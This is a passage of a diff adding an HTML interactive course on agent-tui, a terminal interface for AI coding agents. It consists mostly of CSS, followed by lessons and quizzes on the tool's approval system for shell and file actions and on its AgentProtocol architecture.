@@ -1,0 +1,1831 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>How agent-tui Works — An Interactive Course</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,400;12..96,600;12..96,700;12..96,800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400;1,9..40,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --color-bg: #FAF7F2;
+      --color-bg-warm: #F5F0E8;
+      --color-bg-code: #1E1E2E;
+      --color-text: #2C2A28;
+      --color-text-secondary: #6B6560;
+      --color-text-muted: #9E9790;
+      --color-border: #E5DFD6;
+      --color-border-light: #EEEBE5;
+      --color-surface: #FFFFFF;
+      --color-surface-warm: #FDF9F3;
+      --color-accent: #D94F30;
+      --color-accent-hover: #C4432A;
+      --color-accent-light: #FDEEE9;
+      --color-accent-muted: #E8836C;
+      --color-success: #2D8B55;
+      --color-success-light: #E8F5EE;
+      --color-error: #C93B3B;
+      --color-error-light: #FDE8E8;
+      --color-info: #2A7B9B;
+      --color-info-light: #E4F2F7;
+      --color-actor-1: #D94F30;
+      --color-actor-2: #2A7B9B;
+      --color-actor-3: #7B6DAA;
+      --color-actor-4: #D4A843;
+      --color-actor-5: #2D8B55;
+      --font-display: 'Bricolage Grotesque', Georgia, serif;
+      --font-body: 'DM Sans', -apple-system, sans-serif;
+      --font-mono: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+      --text-xs: 0.75rem;
+      --text-sm: 0.875rem;
+      --text-base: 1rem;
+      --text-lg: 1.125rem;
+      --text-xl: 1.25rem;
+      --text-2xl: 1.5rem;
+      --text-3xl: 1.875rem;
+      --text-4xl: 2.25rem;
+      --text-5xl: 3rem;
+      --text-6xl: 3.75rem;
+      --leading-tight: 1.15;
+      --leading-snug: 1.3;
+      --leading-normal: 1.6;
+      --leading-loose: 1.8;
+      --space-1: 0.25rem;
+      --space-2: 0.5rem;
+      --space-3: 0.75rem;
+      --space-4: 1rem;
+      --space-5: 1.25rem;
+      --space-6: 1.5rem;
+      --space-8: 2rem;
+      --space-10: 2.5rem;
+      --space-12: 3rem;
+      --space-16: 4rem;
+      --space-20: 5rem;
+      --space-24: 6rem;
+      --content-width: 800px;
+      --content-width-wide: 1000px;
+      --nav-height: 50px;
+      --radius-sm: 8px;
+      --radius-md: 12px;
+      --radius-lg: 16px;
+      --radius-full: 9999px;
+      --shadow-sm: 0 1px 2px rgba(44, 42, 40, 0.05);
+      --shadow-md: 0 4px 12px rgba(44, 42, 40, 0.08);
+      --shadow-lg: 0 8px 24px rgba(44, 42, 40, 0.1);
+      --shadow-xl: 0 16px 48px rgba(44, 42, 40, 0.12);
+      --ease-out: cubic-bezier(0.16, 1, 0.3, 1);
+      --ease-in-out: cubic-bezier(0.65, 0, 0.35, 1);
+      --duration-fast: 150ms;
+      --duration-normal: 300ms;
+      --duration-slow: 500ms;
+      --stagger-delay: 120ms;
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-snap-type: y proximity;
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: var(--font-body);
+      font-size: var(--text-base);
+      line-height: var(--leading-normal);
+      color: var(--color-text);
+      background: var(--color-bg);
+      background-image: radial-gradient(ellipse at 20% 50%, rgba(217, 79, 48, 0.03) 0%, transparent 50%);
+    }
+
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--color-border); border-radius: var(--radius-full); }
+
+    /* Navigation */
+    nav.nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: var(--nav-height);
+      background: rgba(250, 247, 242, 0.95);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--color-border-light);
+      z-index: 1000;
+    }
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 3px;
+      background: var(--color-accent);
+      width: 0%;
+      transition: width var(--duration-normal);
+    }
+    .nav-inner {
+      max-width: var(--content-width-wide);
+      margin: 0 auto;
+      padding: 0 var(--space-6);
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .nav-title {
+      font-family: var(--font-display);
+      font-weight: 700;
+      font-size: var(--text-sm);
+      color: var(--color-text);
+    }
+    .nav-dots {
+      display: flex;
+      gap: var(--space-2);
+    }
+    .nav-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      border: 2px solid var(--color-text-muted);
+      background: transparent;
+      cursor: pointer;
+      transition: all var(--duration-fast);
+    }
+    .nav-dot:hover { border-color: var(--color-accent); }
+    .nav-dot.active { border-color: var(--color-accent); background: var(--color-accent); box-shadow: 0 0 8px rgba(217, 79, 48, 0.3); }
+    .nav-dot.visited { background: var(--color-accent-muted); border-color: var(--color-accent-muted); }
+
+    /* Module */
+    .module {
+      min-height: 100dvh;
+      scroll-snap-align: start;
+      padding: var(--space-16) var(--space-6);
+      padding-top: calc(var(--nav-height) + var(--space-12));
+    }
+    .module:nth-child(even) { background: var(--color-bg-warm); }
+    .module-content {
+      max-width: var(--content-width);
+      margin: 0 auto;
+    }
+    .module-header {
+      margin-bottom: var(--space-12);
+    }
+    .module-number {
+      font-family: var(--font-display);
+      font-size: var(--text-6xl);
+      font-weight: 800;
+      color: var(--color-accent);
+      opacity: 0.15;
+      line-height: 1;
+    }
+    .module-title {
+      font-family: var(--font-display);
+      font-size: var(--text-4xl);
+      font-weight: 700;
+      line-height: var(--leading-tight);
+      margin: var(--space-4) 0;
+    }
+    .module-subtitle {
+      font-size: var(--text-lg);
+      color: var(--color-text-secondary);
+      max-width: 600px;
+    }
+
+    /* Animations */
+    .animate-in {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity var(--duration-slow) var(--ease-out), transform var(--duration-slow) var(--ease-out);
+    }
+    .animate-in.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .stagger-children > .animate-in {
+      transition-delay: calc(var(--stagger-index, 0) * var(--stagger-delay));
+    }
+
+    /* Screen */
+    .screen {
+      margin-bottom: var(--space-16);
+    }
+    .screen-heading {
+      font-family: var(--font-display);
+      font-size: var(--text-xl);
+      font-weight: 600;
+      margin-bottom: var(--space-4);
+      color: var(--color-text);
+    }
+
+    /* Hero text */
+    .hero-text {
+      font-family: var(--font-display);
+      font-size: var(--text-5xl);
+      font-weight: 800;
+      line-height: var(--leading-tight);
+      margin-bottom: var(--space-6);
+    }
+    .hero-sub {
+      font-size: var(--text-xl);
+      color: var(--color-text-secondary);
+      max-width: 600px;
+      margin-bottom: var(--space-8);
+    }
+
+    /* Cards */
+    .card {
+      background: var(--color-surface);
+      border-radius: var(--radius-md);
+      padding: var(--space-6);
+      box-shadow: var(--shadow-sm);
+      margin-bottom: var(--space-4);
+    }
+    .card-title {
+      font-family: var(--font-display);
+      font-size: var(--text-lg);
+      font-weight: 600;
+      margin-bottom: var(--space-2);
+    }
+
+    /* Pattern cards grid */
+    .pattern-cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: var(--space-4);
+      margin: var(--space-8) 0;
+    }
+    .pattern-card {
+      background: var(--color-surface);
+      border-radius: var(--radius-md);
+      padding: var(--space-6);
+      box-shadow: var(--shadow-sm);
+      transition: transform var(--duration-normal) var(--ease-out), box-shadow var(--duration-normal);
+    }
+    .pattern-card:hover {
+      transform: translateY(-4px);
+      box-shadow: var(--shadow-md);
+    }
+    .pattern-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.25rem;
+      margin-bottom: var(--space-3);
+    }
+    .pattern-title {
+      font-family: var(--font-display);
+      font-weight: 600;
+      margin-bottom: var(--space-2);
+    }
+    .pattern-desc {
+      font-size: var(--text-sm);
+      color: var(--color-text-secondary);
+    }
+
+    /* Code blocks */
+    pre, code {
+      font-family: var(--font-mono);
+      white-space: pre-wrap;
+      word-break: break-word;
+      overflow-x: hidden;
+    }
+    .code-block {
+      background: var(--color-bg-code);
+      color: #CDD6F4;
+      padding: var(--space-6);
+      border-radius: var(--radius-md);
+      font-size: var(--text-sm);
+      line-height: 1.7;
+      margin: var(--space-6) 0;
+      overflow-x: hidden;
+    }
+    .code-keyword { color: #CBA6F7; }
+    .code-string { color: #A6E3A1; }
+    .code-function { color: #89B4FA; }
+    .code-comment { color: #6C7086; }
+    .code-number { color: #FAB387; }
+    .code-property { color: #F9E2AF; }
+    .code-operator { color: #94E2D5; }
+
+    /* Translation block */
+    .translation-block {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      box-shadow: var(--shadow-md);
+      margin: var(--space-8) 0;
+    }
+    .translation-code {
+      background: var(--color-bg-code);
+      color: #CDD6F4;
+      padding: var(--space-6);
+      font-size: var(--text-sm);
+      line-height: 1.7;
+      position: relative;
+    }
+    .translation-english {
+      background: var(--color-surface-warm);
+      padding: var(--space-6);
+      font-size: var(--text-sm);
+      line-height: 1.7;
+      border-left: 3px solid var(--color-accent);
+    }
+    .translation-label {
+      position: absolute;
+      top: var(--space-2);
+      right: var(--space-3);
+      font-size: var(--text-xs);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      opacity: 0.5;
+    }
+    .translation-english .translation-label {
+      color: var(--color-text-muted);
+    }
+    .tl {
+      margin-bottom: var(--space-3);
+    }
+    .tl:last-child { margin-bottom: 0; }
+
+    /* Callout */
+    .callout {
+      display: flex;
+      gap: var(--space-4);
+      padding: var(--space-5);
+      border-radius: var(--radius-md);
+      margin: var(--space-8) 0;
+    }
+    .callout-accent {
+      background: var(--color-accent-light);
+      border-left: 4px solid var(--color-accent);
+    }
+    .callout-info {
+      background: var(--color-info-light);
+      border-left: 4px solid var(--color-info);
+    }
+    .callout-warning {
+      background: var(--color-error-light);
+      border-left: 4px solid var(--color-error);
+    }
+    .callout-icon {
+      font-size: 1.5rem;
+      flex-shrink: 0;
+    }
+    .callout-content {
+      font-size: var(--text-sm);
+    }
+    .callout-title {
+      display: block;
+      font-weight: 600;
+      margin-bottom: var(--space-1);
+    }
+
+    /* Step cards */
+    .step-cards {
+      display: flex;
+      flex-direction: column;
+      gap: var(--space-3);
+      margin: var(--space-8) 0;
+    }
+    .step-card {
+      display: flex;
+      align-items: flex-start;
+      gap: var(--space-4);
+      padding: var(--space-4) var(--space-5);
+      background: var(--color-surface);
+      border-radius: var(--radius-md);
+      border-left: 3px solid var(--color-accent);
+      box-shadow: var(--shadow-sm);
+    }
+    .step-num {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--color-accent);
+      color: white;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--font-display);
+      flex-shrink: 0;
+    }
+    .step-body strong { display: block; margin-bottom: var(--space-1); }
+    .step-body p { color: var(--color-text-secondary); font-size: var(--text-sm); margin: 0; }
+
+    /* Flow animation */
+    .flow-animation {
+      background: var(--color-surface);
+      border-radius: var(--radius-lg);
+      padding: var(--space-8);
+      margin: var(--space-8) 0;
+      text-align: center;
+    }
+    .flow-actors {
+      display: flex;
+      justify-content: center;
+      gap: var(--space-12);
+      margin-bottom: var(--space-8);
+    }
+    .flow-actor {
+      text-align: center;
+      transition: all var(--duration-normal) var(--ease-out);
+    }
+    .flow-actor.active .flow-actor-icon {
+      box-shadow: 0 0 0 3px var(--color-accent), 0 0 20px rgba(217, 79, 48, 0.3);
+      transform: scale(1.1);
+    }
+    .flow-actor-icon {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      margin: 0 auto var(--space-2);
+      transition: all var(--duration-normal) var(--ease-out);
+    }
+    .flow-actor span { font-size: var(--text-sm); color: var(--color-text-secondary); }
+    .flow-arrow { color: var(--color-accent); font-size: 2rem; display: flex; align-items: center; }
+    .flow-packet {
+      width: 12px;
+      height: 12px;
+      background: var(--color-accent);
+      border-radius: 50%;
+      position: absolute;
+      opacity: 0;
+      transition: all 0.5s var(--ease-out);
+    }
+    .flow-step-label {
+      background: var(--color-bg-warm);
+      padding: var(--space-4);
+      border-radius: var(--radius-md);
+      font-size: var(--text-sm);
+      margin-bottom: var(--space-4);
+      min-height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .flow-controls {
+      display: flex;
+      gap: var(--space-3);
+      justify-content: center;
+      align-items: center;
+    }
+    .flow-controls button {
+      padding: var(--space-2) var(--space-4);
+      border: none;
+      border-radius: var(--radius-sm);
+      background: var(--color-accent);
+      color: white;
+      font-family: var(--font-body);
+      font-size: var(--text-sm);
+      cursor: pointer;
+      transition: background var(--duration-fast);
+    }
+    .flow-controls button:hover { background: var(--color-accent-hover); }
+    .flow-controls button:disabled { opacity: 0.5; cursor: not-allowed; }
+    .flow-progress { font-size: var(--text-sm); color: var(--color-text-muted); }
+
+    /* Group chat */
+    .chat-window {
+      background: var(--color-surface);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      box-shadow: var(--shadow-md);
+      margin: var(--space-8) 0;
+    }
+    .chat-messages { padding: var(--space-4); min-height: 200px; }
+    .chat-message {
+      display: flex;
+      gap: var(--space-3);
+      margin-bottom: var(--space-4);
+      animation: fadeSlideUp 0.3s var(--ease-out);
+    }
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .chat-avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 600;
+      font-size: var(--text-sm);
+      flex-shrink: 0;
+    }
+    .chat-bubble {
+      background: var(--color-bg-warm);
+      padding: var(--space-3) var(--space-4);
+      border-radius: var(--radius-md);
+      flex: 1;
+    }
+    .chat-sender { font-weight: 600; font-size: var(--text-xs); display: block; margin-bottom: var(--space-1); }
+    .chat-bubble p { margin: 0; font-size: var(--text-sm); }
+    .chat-typing {
+      display: flex;
+      align-items: center;
+      gap: var(--space-3);
+      padding: var(--space-3) var(--space-4);
+      background: var(--color-bg-warm);
+    }
+    .chat-typing-dots { display: flex; gap: 4px; }
+    .typing-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--color-text-muted);
+      animation: typingBounce 1.4s infinite;
+    }
+    .typing-dot:nth-child(2) { animation-delay: 0.2s; }
+    .typing-dot:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes typingBounce {
+      0%, 60%, 100% { transform: translateY(0); }
+      30% { transform: translateY(-6px); }
+    }
+    .chat-controls {
+      display: flex;
+      gap: var(--space-3);
+      padding: var(--space-3) var(--space-4);
+      background: var(--color-bg);
+      border-top: 1px solid var(--color-border-light);
+    }
+    .chat-controls button {
+      padding: var(--space-2) var(--space-3);
+      border: 1px solid var(--color-border);
+      border-radius: var(--radius-sm);
+      background: var(--color-surface);
+      font-size: var(--text-xs);
+      cursor: pointer;
+    }
+    .chat-controls button:hover { border-color: var(--color-accent); }
+    .chat-progress { font-size: var(--text-xs); color: var(--color-text-muted); margin-left: auto; display: flex; align-items: center; }
+
+    /* Quiz */
+    .quiz-container { margin: var(--space-8) 0; }
+    .quiz-question-block { margin-bottom: var(--space-6); }
+    .quiz-question {
+      font-family: var(--font-display);
+      font-size: var(--text-lg);
+      font-weight: 600;
+      margin-bottom: var(--space-4);
+    }
+    .quiz-options { display: flex; flex-direction: column; gap: var(--space-2); }
+    .quiz-option {
+      display: flex;
+      align-items: center;
+      gap: var(--space-3);
+      padding: var(--space-3) var(--space-4);
+      border: 2px solid var(--color-border);
+      border-radius: var(--radius-sm);
+      background: var(--color-surface);
+      cursor: pointer;
+      font-family: var(--font-body);
+      font-size: var(--text-base);
+      text-align: left;
+      transition: border-color var(--duration-fast), background var(--duration-fast);
+    }
+    .quiz-option:hover { border-color: var(--color-accent-muted); }
+    .quiz-option.selected { border-color: var(--color-accent); background: var(--color-accent-light); }
+    .quiz-option.correct { border-color: var(--color-success); background: var(--color-success-light); }
+    .quiz-option.incorrect { border-color: var(--color-error); background: var(--color-error-light); }
+    .quiz-option-radio {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2px solid var(--color-border);
+      flex-shrink: 0;
+      transition: all var(--duration-fast);
+    }
+    .quiz-option.selected .quiz-option-radio {
+      border-color: var(--color-accent);
+      background: var(--color-accent);
+      box-shadow: inset 0 0 0 3px white;
+    }
+    .quiz-feedback {
+      max-height: 0;
+      overflow: hidden;
+      opacity: 0;
+      transition: max-height var(--duration-normal), opacity var(--duration-normal);
+      margin-top: var(--space-2);
+    }
+    .quiz-feedback.show {
+      max-height: 200px;
+      opacity: 1;
+      padding: var(--space-3);
+      border-radius: var(--radius-sm);
+    }
+    .quiz-feedback.success { background: var(--color-success-light); color: var(--color-success); }
+    .quiz-feedback.error { background: var(--color-error-light); color: var(--color-error); }
+    .quiz-feedback.warning { background: var(--color-info-light); color: var(--color-info); }
+    .quiz-check-btn {
+      padding: var(--space-3) var(--space-6);
+      border: none;
+      border-radius: var(--radius-sm);
+      background: var(--color-accent);
+      color: white;
+      font-family: var(--font-body);
+      font-weight: 600;
+      cursor: pointer;
+      margin-right: var(--space-3);
+    }
+    .quiz-check-btn:hover { background: var(--color-accent-hover); }
+    .quiz-reset-btn {
+      padding: var(--space-3) var(--space-6);
+      border: 1px solid var(--color-border);
+      border-radius: var(--radius-sm);
+      background: var(--color-surface);
+      cursor: pointer;
+    }
+
+    /* Term tooltip */
+    .term {
+      border-bottom: 1.5px dashed var(--color-accent-muted);
+      cursor: pointer;
+    }
+    .term:hover, .term.active {
+      border-bottom-color: var(--color-accent);
+      color: var(--color-accent);
+    }
+    .term-tooltip {
+      position: fixed;
+      background: var(--color-bg-code);
+      color: #CDD6F4;
+      padding: var(--space-3) var(--space-4);
+      border-radius: var(--radius-sm);
+      font-size: var(--text-sm);
+      font-family: var(--font-body);
+      line-height: var(--leading-normal);
+      width: max(200px, min(320px, 80vw));
+      box-shadow: var(--shadow-lg);
+      pointer-events: none;
+      opacity: 0;
+      transition: opacity var(--duration-fast);
+      z-index: 10000;
+    }
+    .term-tooltip.visible { opacity: 1; }
+
+    /* Icon rows */
+    .icon-rows { display: flex; flex-direction: column; gap: var(--space-4); margin: var(--space-6) 0; }
+    .icon-row {
+      display: flex;
+      align-items: center;
+      gap: var(--space-4);
+      padding: var(--space-4);
+      background: var(--color-surface);
+      border-radius: var(--radius-md);
+      box-shadow: var(--shadow-sm);
+    }
+    .icon-circle {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.25rem;
+      flex-shrink: 0;
+    }
+    .icon-row p { margin: 0; color: var(--color-text-secondary); font-size: var(--text-sm); }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      :root {
+        --text-4xl: 1.875rem;
+        --text-5xl: 2.25rem;
+        --text-6xl: 3rem;
+      }
+      .translation-block { grid-template-columns: 1fr; }
+      .translation-english { border-left: none; border-top: 3px solid var(--color-accent); }
+      .pattern-cards { grid-template-columns: 1fr 1fr; }
+      .flow-actors { flex-direction: column; align-items: center; gap: var(--space-4); }
+      .flow-arrow { transform: rotate(90deg); }
+    }
+    @media (max-width: 480px) {
+      :root {
+        --text-4xl: 1.5rem;
+        --text-5xl: 1.875rem;
+        --text-6xl: 2.25rem;
+      }
+      .module { padding: var(--space-8) var(--space-4); }
+      .pattern-cards { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Navigation -->
+<nav class="nav">
+  <div class="progress-bar" id="progress-bar"></div>
+  <div class="nav-inner">
+    <span class="nav-title">How agent-tui Works</span>
+    <div class="nav-dots">
+      <button class="nav-dot active" data-target="module-1" aria-label="Module 1"></button>
+      <button class="nav-dot" data-target="module-2" aria-label="Module 2"></button>
+      <button class="nav-dot" data-target="module-3" aria-label="Module 3"></button>
+      <button class="nav-dot" data-target="module-4" aria-label="Module 4"></button>
+      <button class="nav-dot" data-target="module-5" aria-label="Module 5"></button>
+      <button class="nav-dot" data-target="module-6" aria-label="Module 6"></button>
+    </div>
+  </div>
+</nav>
+
+<!-- Module 1: What is agent-tui? -->
+<section class="module" id="module-1">
+  <div class="module-content">
+    <header class="module-header animate-in">
+      <span class="module-number">01</span>
+      <h1 class="module-title">What is agent-tui?</h1>
+      <p class="module-subtitle">A terminal that talks to AI coding agents — with safety guardrails built in</p>
+    </header>
+
+    <div class="screen animate-in">
+      <p class="hero-text">Your AI coding assistant,<br>in the terminal</p>
+      <p class="hero-sub">agent-tui is a Text-based User Interface that lets you chat with an AI agent that can read your files, run shell commands, and help you code — all without leaving your terminal.</p>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Why use a TUI instead of a web interface?</h2>
+      <div class="pattern-cards stagger-children">
+        <div class="pattern-card animate-in" style="--stagger-index: 0">
+          <div class="pattern-icon" style="background: var(--color-actor-1)">⌨️</div>
+          <h4 class="pattern-title">No browser needed</h4>
+          <p class="pattern-desc">Works entirely in your terminal — perfect for server environments or SSH connections</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 1">
+          <div class="pattern-icon" style="background: var(--color-actor-2)">⚡</div>
+          <h4 class="pattern-title">Keyboard-first</h4>
+          <p class="pattern-desc">Fast navigation without touching a mouse — exactly how developers like it</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 2">
+          <div class="pattern-icon" style="background: var(--color-actor-3)">🛡️</div>
+          <h4 class="pattern-title">Built-in safety</h4>
+          <p class="pattern-desc">Every file operation and shell command requires your approval before running</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">What can the AI agent do?</h2>
+      <div class="step-cards stagger-children">
+        <div class="step-card animate-in" style="--stagger-index: 0">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <strong>Read your files</strong>
+            <p>Ask it to explain a codebase, debug an error, or review code changes</p>
+          </div>
+        </div>
+        <div class="step-card animate-in" style="--stagger-index: 1">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <strong>Write and edit files</strong>
+            <p>Have it create new features, refactor code, or fix bugs directly</p>
+          </div>
+        </div>
+        <div class="step-card animate-in" style="--stagger-index: 2">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <strong>Run shell commands</strong>
+            <p>Execute build tools, tests, git commands — all with your approval</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The approval system in action</h2>
+      <div class="flow-animation">
+        <p style="margin-bottom: var(--space-4); color: var(--color-text-secondary); font-size: var(--text-sm);">Click "Next Step" to see what happens when you ask the agent to run a shell command</p>
+        <div class="flow-actors">
+          <div class="flow-actor" id="flow-user">
+            <div class="flow-actor-icon" style="background: var(--color-actor-1)">👤</div>
+            <span>You</span>
+          </div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-actor" id="flow-agent">
+            <div class="flow-actor-icon" style="background: var(--color-actor-2)">🤖</div>
+            <span>Agent</span>
+          </div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-actor" id="flow-tui">
+            <div class="flow-actor-icon" style="background: var(--color-actor-3)">🖥️</div>
+            <span>TUI</span>
+          </div>
+        </div>
+        <div class="flow-step-label" id="flow-label">Click "Next Step" to begin</div>
+        <div class="flow-controls">
+          <button onclick="flowNext()">Next Step</button>
+          <button onclick="flowReset()">Restart</button>
+          <span class="flow-progress" id="flow-progress">Step 0/4</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <div class="callout callout-accent">
+        <div class="callout-icon">💡</div>
+        <div class="callout-content">
+          <strong class="callout-title">The key insight</strong>
+          <p>agent-tui uses a clever pattern called the <span class="term" data-definition="A contract is like a job description — it defines what methods an object must have, without specifying how they're implemented. Think of it as a blueprint for how two pieces of code should communicate.">Protocol</span>. The TUI doesn't care which AI backend you use — it just knows how to talk to any agent that follows the protocol.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Quick check: What did you learn?</h2>
+      <div class="quiz-container" id="quiz-1">
+        <div class="quiz-question-block" data-question="q1" data-correct="option-b">
+          <h3 class="quiz-question">You want to run a shell command, but you're not sure if it's safe. What happens in agent-tui?</h3>
+          <div class="quiz-options">
+            <button class="quiz-option" data-value="option-a" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>It runs automatically — AI knows best</span>
+            </button>
+            <button class="quiz-option" data-value="option-b" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>You see an approval widget and must explicitly allow or deny it</span>
+            </button>
+            <button class="quiz-option" data-value="option-c" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>The TUI asks you to type "yes" in the chat</span>
+            </button>
+          </div>
+          <div class="quiz-feedback" id="q1-feedback"></div>
+        </div>
+
+        <div class="quiz-question-block" data-question="q2" data-correct="option-a">
+          <h3 class="quiz-question">Why does agent-tui use a Protocol instead of hardcoding one specific AI backend?</h3>
+          <div class="quiz-options">
+            <button class="quiz-option" data-value="option-a" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>So you can swap between different AI backends without changing the TUI code</span>
+            </button>
+            <button class="quiz-option" data-value="option-b" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>Because Python requires it</span>
+            </button>
+            <button class="quiz-option" data-value="option-c" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>It's faster than direct integration</span>
+            </button>
+          </div>
+          <div class="quiz-feedback" id="q2-feedback"></div>
+        </div>
+
+        <button class="quiz-check-btn" onclick="checkQuiz('quiz-1')">Check Answers</button>
+        <button class="quiz-reset-btn" onclick="resetQuiz('quiz-1')">Try Again</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Module 2: Meet the Cast of Characters -->
+<section class="module" id="module-2">
+  <div class="module-content">
+    <header class="module-header animate-in">
+      <span class="module-number">02</span>
+      <h1 class="module-title">Meet the Cast of Characters</h1>
+      <p class="module-subtitle">The main players in agent-tui's architecture</p>
+    </header>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The six key components</h2>
+      <p style="margin-bottom: var(--space-6);">Every software system has actors that work together. Here are the main ones in agent-tui:</p>
+      <div class="icon-rows">
+        <div class="icon-row animate-in" style="--stagger-index: 0">
+          <div class="icon-circle" style="background: var(--color-actor-1)">🖥️</div>
+          <div>
+            <strong>AgentTuiApp</strong>
+            <p>The main application — the conductor that orchestrates everything</p>
+          </div>
+        </div>
+        <div class="icon-row animate-in" style="--stagger-index: 1">
+          <div class="icon-circle" style="background: var(--color-actor-2)">🔌</div>
+          <div>
+            <strong>AgentAdapter</strong>
+            <p>Translates events from the agent into actions the TUI can perform</p>
+          </div>
+        </div>
+        <div class="icon-row animate-in" style="--stagger-index: 2">
+          <div class="icon-circle" style="background: var(--color-actor-3)">📝</div>
+          <div>
+            <strong>AgentProtocol</strong>
+            <p>The contract — defines how any agent must behave to work with the TUI</p>
+          </div>
+        </div>
+        <div class="icon-row animate-in" style="--stagger-index: 3">
+          <div class="icon-circle" style="background: var(--color-actor-4)">🎭</div>
+          <div>
+            <strong>StubAgent</strong>
+            <p>A fake agent for testing — cycles through different scenarios automatically</p>
+          </div>
+        </div>
+        <div class="icon-row animate-in" style="--stagger-index: 4">
+          <div class="icon-circle" style="background: var(--color-actor-5)">🔧</div>
+          <div>
+            <strong>DeepAgentsAdapter</strong>
+            <p>The real agent backend — connects to actual AI models</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">AgentProtocol — the contract</h2>
+      <p style="margin-bottom: var(--space-4);">The protocol defines what any agent must be able to do. Here's the core of it:</p>
+      <div class="translation-block">
+        <div class="translation-code">
+          <span class="translation-label">CODE</span>
+          <pre><code><span class="code-keyword">class</span> <span class="code-function">AgentProtocol</span>(Protocol):
+  <span class="code-keyword">async def</span> <span class="code-function">stream</span>(message, thread_id):
+    <span class="code-keyword">yield</span> AgentEvent(...)
+
+  <span class="code-keyword">async def</span> <span class="code-function">approve_tool</span>(tool_id, approved):
+    <span class="code-keyword">...</span>
+
+  <span class="code-keyword">async def</span> <span class="code-function">cancel</span>():
+    <span class="code-keyword">...</span></code></pre>
+        </div>
+        <div class="translation-english">
+          <span class="translation-label">PLAIN ENGLISH</span>
+          <p class="tl"><strong>stream()</strong> — Takes your message, spits out events like "here's some text" or "I want to run a tool"</p>
+          <p class="tl"><strong>approve_tool()</strong> — Called when you click Yes/No on an approval widget</p>
+          <p class="tl"><strong>cancel()</strong> — Stops whatever the agent is currently doing</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">AgentEvent — what messages look like</h2>
+      <p style="margin-bottom: var(--space-4);">Agents communicate with the TUI using typed events. Each event has a type and relevant data:</p>
+      <div class="step-cards stagger-children">
+        <div class="step-card animate-in" style="--stagger-index: 0">
+          <div class="step-num" style="background: var(--color-actor-1)">📝</div>
+          <div class="step-body">
+            <strong>MESSAGE_CHUNK</strong>
+            <p>A piece of text the agent is streaming to you — appears letter by letter</p>
